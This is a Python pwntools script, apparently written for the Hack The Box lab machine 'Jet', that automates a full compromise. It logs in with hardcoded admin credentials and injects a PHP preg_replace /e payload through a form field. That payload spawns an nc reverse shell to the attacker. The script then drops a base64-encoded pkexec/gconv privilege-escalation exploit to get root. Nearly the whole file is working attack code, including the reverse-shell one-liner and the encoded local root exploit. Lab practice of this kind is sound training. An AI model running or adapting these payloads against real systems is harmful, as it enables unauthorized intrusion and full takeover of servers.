try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Pawn Hackthebox Machine Jet ~ 3mm412\n")
except:
    print("\n[\033[1;31m!\033[1;37m] The script needs root privileges\n\n[\033[1;31m!\033[1;37m] Remember to have the pwntools library installed\n")
    exit(1)
    
    if len(sys.argv) < 2:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

os.system("echo '10.13.37.10 www.securewebinc.jet' >> /etc/hosts")

target = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/"
session = requests.Session()
ip = sys.argv[1]

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

def login():
    creds = {
        "username": "admin",
        "password": "Hackthesystem200"
    }
    session.post(target + '/dologin.php', data=creds, verify=False)

def cmd():
    time.sleep(2)
    data = {
        "swearwords[/fuck/e]": f"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 443 >/tmp/f');",
        "swearwords[/shit/i]": "poop",
        "swearwords[/ass/i]": "behind",
        "swearwords[/dick/i]": "penis",
        "swearwords[/whore/i]": "escort",
        "swearwords[/asshole/i]": "bad person",
        "to": "gato@gato.com",
        "subject": "gato",
        "message": "fuck",
        "_wysihtml5_mode": 1
    }
    session.post(target + '/email.php', data=data, verify=False)

login()
time.sleep(2)
threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=60).wait_for_connection()
shell.sendline(b"export HOME=/var/www TERM=xterm")
time.sleep(0.5)
payload = (b"aW1wb3J0IGJhc2U2NCxvcyxzeXMKZnJvbSBjdHlwZXMgaW1wb3J0ICoKZnJvbSBjdHlwZXMudXRp\nbCBpbXBvcnQgZmluZF9saWJyYXJ5CgpwYXlsb2FkX2I2NCA9IGIiZjBWTVJnSUJBUUFBQUFBQUFB\nQUFBQU1BUGdBQkFBQUFrZ0VBQUFBQUFBQkFBQUFBQUFBQUFMQUFBQUFBQUFBQUFBQUFBRUFBT0FB\nQ1xuQUVBQUFnQUJBQUVBQUFBSEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXJ3\nRUFBQUFBQUFETUFRQUFBQUFBQUFBUVxuQUFBQUFBQUFBZ0FBQUFjQUFBQXdBUUFBQUFBQUFEQUJB\nQUFBQUFBQU1BRUFBQUFBQUFCZ0FBQUFBQUFBQUdBQUFBQUFBQUFBQUJBQVxuQUFBQUFBQUJBQUFB\nQmdBQUFBQUFBQUFBQUFBQU1BRUFBQUFBQUFBd0FRQUFBQUFBQUdBQUFBQUFBQUFBQUFBQUFBQUFB\nQUFJQUFBQVxuQUFBQUFBY0FBQUFBQUFBQUFBQUFBQU1BQUFBQUFBQUFBQUFBQUpBQkFBQUFBQUFB\na0FFQUFBQUFBQUFDQUFBQUFBQUFBQUFBQUFBQVxuQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF3\nQUFBQUFBQUFBa2dFQUFBQUFBQUFGQUFBQUFBQUFBSkFCQUFBQUFBQUFCZ0FBQUFBQVxuQUFDUUFR\nQUFBQUFBQUFvQUFBQUFBQUFBQUFBQUFBQUFBQUFMQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\nQUFBQUFBQUFBQUFBQVxuQUFBQVNESC9hbWxZRHdWSXVDOWlhVzR2YzJnQW1WQlVYMUplYWp0WUR3\nVT0iCgpwYXlsb2FkID0gYmFzZTY0LmI2NGRlY29kZShwYXlsb2FkX2I2NCkKCmVudmlyb24gPSBb\nCiAgICAgICAgYidleHBsb2l0JywKICAgICAgICBiJ1BBVEg9R0NPTlZfUEFUSD0uJywKICAgICAg\nICBiJ0xDX01FU1NBR0VTPWVuX1VTLlVURi04JywKICAgICAgICBiJ1hBVVRIT1JJVFk9Li4vTE9M\nJywKICAgICAgICBOb25lCl0KCnRyeToKICAgIGxpYmMgPSBDRExMKGZpbmRfbGlicmFyeSgnYycp\nKQpleGNlcHQ6CiAgICBzeXMuZXhpdCgpCgp0cnk6CiAgICB3aXRoIG9wZW4oJ3BheWxvYWQuc28n\nLCAnd2InKSBhcyBmOgogICAgICAgIGYud3JpdGUocGF5bG9hZCkKZXhjZXB0OgogICAgc3lzLmV4\naXQoKQpvcy5jaG1vZCgncGF5bG9hZC5zbycsIDBvMDc1NSkKCnRyeToKICAgIG9zLm1rZGlyKCdH\nQ09OVl9QQVRIPS4nKQpleGNlcHQgRmlsZUV4aXN0c0Vycm9yOgogICAgcHJpbnQoJycpCmV4Y2Vw\ndDoKICAgIHN5cy5leGl0KCkKCnRyeToKICAgIHdpdGggb3BlbignR0NPTlZfUEFUSD0uL2V4cGxv\naXQnLCAnd2InKSBhcyBmOgogICAgICAgIGYud3JpdGUoYicnKQpleGNlcHQ6CiAgICBzeXMuZXhp\ndCgpCm9zLmNobW9kKCdHQ09OVl9QQVRIPS4vZXhwbG9pdCcsIDBvMDc1NSkKCnRyeToKICAgIG9z\nLm1rZGlyKCdleHBsb2l0JykKZXhjZXB0IEZpbGVFeGlzdHNFcnJvcjoKICAgIHByaW50KCcnKQpl\neGNlcHQ6CiAgICBzeXMuZXhpdCgpCgp0cnk6CiAgICB3aXRoIG9wZW4oJ2V4cGxvaXQvZ2NvbnYt\nbW9kdWxlcycsICd3YicpIGFzIGY6CiAgICAgICAgZi53cml0ZShiJ21vZHVsZSAgVVRGLTgvLyAg\nICBJTlRFUk5BTCAgICAuLi9wYXlsb2FkICAgIDJcbicpOwpleGNlcHQ6CiAgICBzeXMuZXhpdCgp\nCgplbnZpcm9uX3AgPSAoY19jaGFyX3AgKiBsZW4oZW52aXJvbikpKCkKZW52aXJvbl9wWzpdID0g\nZW52aXJvbgoKbGliYy5leGVjdmUoYicvdXNyL2Jpbi9wa2V4ZWMnLCBjX2NoYXJfcChOb25lKSwg\nZW52aXJvbl9wKQo=")
shell.sendline(b"cd /tmp; echo '%s' | base64 -d > exploit.py; echo 'uid=0(root)'" % (payload))
time.sleep(0.5)
shell.sendline(b"python3 exploit.py")
time.sleep(0.5)
shell.sendline(b"export HOME=/root TERM=xterm; cd")
time.sleep(0.5)
shell.sendline(b"sudo su")
shell.interactive()
